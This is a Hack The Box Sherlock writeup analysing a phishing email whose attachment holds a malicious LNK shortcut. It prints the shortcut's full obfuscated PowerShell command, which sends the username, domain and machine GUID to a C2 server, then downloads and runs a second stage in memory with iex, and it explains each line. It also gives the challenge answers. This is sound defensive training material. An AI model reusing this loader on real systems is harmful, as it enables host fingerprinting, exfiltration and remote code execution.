+++
title = 'Hack The Box — AoTR 1: A Call from the Museum Writeup'
date = '2026-07-26'
draft = false
tags = ["Reversing", "Windows", "Malware"]
summary = 'A Hack The Box malware analysis Sherlock involving phishing email and Windows LNK analysis.'
[cover]
image = ''
+++

We are provided with the following ZIP archive:

- Filename: **AoTR-1_A-Call-from-the-Museum.zip**
- Password: **hacktheblue**

We can unzip the archive as follows:

```bash
unzip AoTR-1_A-Call-from-the-Museum.zip
```

This extracts two files:
- `Part 1 - A Call from the Museum.pdf`: which is not relevant to the Sherlock itself
- `URGENT_ Updated Health & Customs Compliance for Cross-Border Festive Event.eml`: a phishing email

{{< figure src="image_1.png" align="center" >}}

Let's open the email in Thunderbird to get a better look:

```bash
thunderbird URGENT_\ Updated\ Health\ \&\ Customs\ Compliance\ for\ Cross-Border\ Festive\ Event.eml
```

{{< figure src="image_2.png" align="center" >}}

# Task 1

> Who is the suspicious sender of the email?

We can find the answer both in the email headers and in Thunderbird:

{{< figure src="image_3.png" align="center" >}}

Answer: **eu-health@ca1e-corp[.]org** (refang to answer)

# Task 2

>What is the legitimate server that initially sent the email?

We can find the answer both in the email headers and in Thunderbird:

{{< figure src="image_4.png" align="center" >}}

Answer: **BG3O293MB0335.SRBL293[.]PROD[.]OUTLOOK[.]COM** (refang to answer)

# Task 3

>What is the attachment filename?

We can find the answer both in the email headers and in Thunderbird:

{{< figure src="image_5.png" align="center" >}}

Answer: **Health_Clearance-December_Archive.zip**

# Task 4

>What is the Document Code?

We have to download the ZIP attachment (`Health_Clearance-December_Archive.zip`) and extract it using the password found in the email; `Up7Pk99G`.

This extracts two files:

{{< figure src="image_6.png" align="center" >}}

The document code can be found in `Health_Clearance_Guidelines.pdf`:

{{< figure src="image_7.png" align="center" >}}

Answer: **EU-HMU-24X**

# Analyzing the LNK File

Prior to answering the remaining tasks, we have to dig into the LNK file `EU_Health_Compliance_Portal.lnk`.

First, we can use `exiftool` to find out what the file executes.

```bash
exiftool EU_Health_Compliance_Portal.lnk
```

{{< figure src="image_8.png" align="center" >}}

This gives us the following command line arguments:

```powershell
-nONi -nOp -eXeC bYPaSs -cOmManD "$Bs = (-join('Basic c3','ZjX3Rlb','XA6U2','5','vd0JsY','WNrT','3V','0X','zIwM','jYh'));sap`s .\Health_Clearance_Guidelines.pdf;$AX=$env:USERNAME;$oM=[System.Uri]::UnescapeDataString('https%3A%2F%2Fhealth%2Dstatus%2Drs%2Ecom%2Fapi%2Fv1%2Fcheckin');$Bz=$env:USERDOMAIN;$Lj=[System.Uri]::UnescapeDataString('https%3A%2F%2Fadvent%2Dof%2Dthe%2Drelics%2Dforum%2Ehtb%2Eblue%2Fapi%2Fv1%2Fimplant%2Fcid%3D');$Mw=(gp HKLM:\SOFTWARE\Microsoft\Cryptography).MachineGuid;$pP = @{u=$AX;d=$Bz;g=$Mw};$Zu=(i`wr $oM -Method POST -Body $pP).Content;$Hd = @{Authorization = $Bs };i`wr -Headers $Hd $Lj$Zu | i`ex;
```

- `-nONi` - non-interactive
- `-nOp` - no profile
- `-eXeC bYPaSs` - bypass the execution policy
- `-cOmManD` - the command to execute

Breaking it down into chunks, we can start to understand what it executes.

The following line is joined into `Basic c3ZjX3RlbXA6U25vd0JsYWNrT3V0XzIwMjYh`, which is just an HTTP auth header encoded in base64.

Decoded, it reveals the credentials `svc_temp:SnowBlackOut_2026!`.

```powershell
"$Bs = (-join('Basic c3','ZjX3Rlb','XA6U2','5','vd0JsY','WNrT','3V','0X','zIwM','jYh'));
```

The second line opens the PDF `.\Health_Clearance_Guidelines.pdf` using  ``sap`s`` - an alias for `Start-Process` where the backtick denotes an invalid escape sequence.

```powershell
sap`s .\Health_Clearance_Guidelines.pdf;
```

The `USERNAME` environment variable is saved into `AX`.

```powershell
$AX=$env:USERNAME;
```

A string is URL-decoded into `hxxps://health-status-rs[.]com/api/v1/checkin` (defanged), and saved into `oM`.

```powershell
$oM=[System.Uri]::UnescapeDataString('https%3A%2F%2Fhealth%2Dstatus%2Drs%2Ecom%2Fapi%2Fv1%2Fcheckin');
```

The `USERDOMAIN` environment variable is saved into `Bz`.

```powershell
$Bz=$env:USERDOMAIN;
```

Another string is URL-decoded into `hxxps://advent-of-the-relics-forum[.]htb[.]blue/api/v1/implant/cid=` (defanged), and saved into `Lj`.

```powershell
$Lj=[System.Uri]::UnescapeDataString('https%3A%2F%2Fadvent%2Dof%2Dthe%2Drelics%2Dforum%2Ehtb%2Eblue%2Fapi%2Fv1%2Fimplant%2Fcid%3D');
```

The machine's GUID is saved into `Mw` using `gp` - an alias for `Get-ItemProperty` from the registry key `HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid`.

```powershell
$Mw=(gp HKLM:\SOFTWARE\Microsoft\Cryptography).MachineGuid;
```

A hashtable (`pP`) is constructed where `u` is the username, `d` is the domain and `g` is the machine's GUID.

```powershell
$pP = @{u=$AX;d=$Bz;g=$Mw};
```

The next line effectively executes `iwr hxxps://health-status-rs[.]com/api/v1/checkin -Method POST -Body` with the hashtable, and saves the response into `Zu`.

```powershell
$Zu=(i`wr $oM -Method POST -Body $pP).Content;
```

The HTTP authorization credentials are saved into `Hd`.

```powershell
$Hd = @{Authorization = $Bs };
```

And the final line effectively runs `iwr -Headers (basic auth) hxxps://advent-of-the-relics-forum[.]htb[.]blue/api/v1/implant/cid=(response from hxxps://health-status-rs[.]com/api/v1/checkin) | iex`, downloading and executing another payload in-memory.

```powershell
i`wr -Headers $Hd $Lj$Zu | i`ex;
```

Now that we have a grasp on what the first LNK stage does, we can answer the remaining tasks.

# Task 5

>What is the full URL of the C2 contacted through a POST request?

Answer: `hxxps://health-status-rs[.]com/api/v1/checkin` (refang to answer)

# Task 6

>The malicious script sent three pieces of information in the POST request. What is the registry key from which the last one is retrieved?

Answer: `HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid`

# Task 7

>Then the script downloads and executes a second stage from another URL. What is the domain?

Answer: `advent-of-the-relics-forum[.]htb[.]blue` (refang to answer)

# Task 8

>A set of credentials was used to access the previous resource. Retrieve them.

Answer: `svc_temp:SnowBlackOut_2026!`

# Indicators of Compromise

| Filename | SHA256 | SHA1 | MD5 |
| --- | --- | --- | --- |
| EU_Health_Compliance_Portal.lnk | e5389af56fae1ed9c3eb85a96bd0f0a2493cec8129c7767bb6b792d1f583144e | f849e5d58c9bd8d5e9af2616771f88cbb7a3bfe2 | 73c4fad2a4d437fa1d21dd75a17aad7f |
| Health_Clearance-December_Archive.zip | 996086822eb72a68bbbadbaf109e396742eb8d0248a97a1b463bc9e6171aa965 | 7f058d907afcd374b53f02cb2429cf074548df35 | 665a2aebbc54675d158ade2af8488bea |
| Health_Clearance_Guidelines.pdf | d86fe689a701e481a503ee2a31a35019e49030080df10830c9977a1832226658 | 6dd4268311a071f08b4086e6fca57dc7b5db1a80 | 69284cdee3da933be6b98d72e7f056a1 |
